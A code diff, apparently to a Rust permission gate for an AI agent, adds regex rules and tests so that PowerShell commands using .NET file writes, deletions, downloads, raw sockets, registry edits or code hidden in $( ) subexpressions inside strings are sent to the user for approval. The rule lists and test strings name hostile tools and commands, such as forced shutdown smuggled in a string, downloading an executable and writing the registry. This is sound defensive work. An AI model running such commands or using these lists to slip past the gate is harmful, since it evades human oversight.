@@ -44,6 +44,10 @@ static ACTION_RULES: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
         (r"(?i)(^|[;|{(\n]|\s)[&.]\s*[($]|\$executioncontext\b|\bget-command\b[^|;\n]*\|\s*(%|foreach|invoke)", "it runs a command built at run time"),
         (r#"(?i)(^|[;|&\n({]\s*)(powershell|pwsh|cmd)(\.exe)?\b|\b(start-process|saps|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|msbuild|installutil)\b|\[(system\.)?diagnostics\.process\]"#, "it starts other programs"),
         (r"(?i)\b(add-type|frombase64string|invoke-(wmi|cim)method|new-object\s+-com(object)?|invoke-command|enter-pssession|new-pssession|set-alias|new-alias)\b|\[(system\.)?reflection\.assembly\]|\[activator\]", "it runs code in a way that can't be checked"),
+        // .NET can write, delete and send without any of the cmdlets above,
+        // and the folder check below only knows the cmdlets.
+        (r"(?i)\[(system\.)?io\.(file|directory)\]::(write|append|delete|move|copy|create|open|replace|set|encrypt|decrypt)\w*|\bnew-object\s+\(?(system\.)?io\.(streamwriter|filestream|binarywriter|filesystemwatcher)\b|\[(system\.)?io\.(streamwriter|filestream|binarywriter)\]|\.(delete|moveto|copyto|downloadfile)\s*\(", "it changes files in a way that can't be checked"),
+        (r"(?i)\[(system\.)?net\.sockets\.|\bnew-object\s+\(?(system\.)?net\.sockets\.|\[microsoft\.win32\.registry", "it opens raw connections or edits the registry in a way that can't be checked"),
     ])
 });
 
@@ -64,7 +68,13 @@ static URLS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"(?i)\bhttps?://[^\
 
 /// Why a command must go to the user no matter what, if it does.
 pub fn hard_rule(command: &str) -> Option<&'static str> {
-    let actions = STRINGS.replace_all(command, "\"\"");
+    // Quoted text is blanked so a command that only prints "shutdown" isn't
+    // mistaken for one. Except double-quoted text with `$( … )` in it:
+    // PowerShell runs that code when it builds the string.
+    let actions = STRINGS.replace_all(command, |c: &regex::Captures| {
+        let m = &c[0];
+        if m.starts_with('"') && m.contains("$(") { m.to_owned() } else { "\"\"".to_owned() }
+    });
     let places = URLS.replace_all(command, "URL");
     ACTION_RULES
         .iter()
@@ -169,6 +179,17 @@ mod tests {
             "'x' > C:\\Users\\me\\a.txt",
             "New-Item -ItemType Junction -Path door -Target C:\\",
             "Invoke-CimMethod -ClassName Win32_Process -MethodName Create",
+            // Code inside a double-quoted string runs when the string is built:
+            "Write-Output \"$(Stop-Computer -Force)\"",
+            "Write-Host \"done: $(Restart-Computer)\"",
+            // .NET calls that write, delete or open raw connections:
+            "[IO.File]::WriteAllText(\"C:\\Users\\dummy\\outside.txt\", \"audit\")",
+            "[System.IO.File]::Delete('notes.txt')",
+            "[System.IO.Directory]::Move('a', 'b')",
+            "(New-Object System.Net.WebClient).DownloadFile('https://x.y/a.exe', 'a.exe')",
+            "(Get-Item .\\a.txt).Delete()",
+            "$c = New-Object System.Net.Sockets.TcpClient('x.y', 80)",
+            "[Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\\X', 'Y', 1)",
         ] {
             assert!(hard_rule(cmd).is_some(), "should need the user: {cmd}");
         }
@@ -194,6 +215,12 @@ mod tests {
             "1..5 | ForEach-Object { $_ * 2 }",
             "Set-Content .\\notes.txt 'hi'",
             "Get-ChildItem | Where-Object { $_.Length -gt 1MB } | Sort-Object Length",
+            // Reading with .NET, and strings that merely contain text, are fine:
+            "[IO.File]::ReadAllText('notes.txt')",
+            "[IO.Path]::Combine('a', 'b')",
+            "Write-Output \"Total: $total items (shutdown at 5pm)\"",
+            "\"$(Get-Date)\"",
+            "(New-Object System.Net.WebClient).DownloadString('https://example.com/')",
         ] {
             assert!(hard_rule(cmd).is_none(), "should run in auto mode: {cmd} ({:?})", hard_rule(cmd));
         }
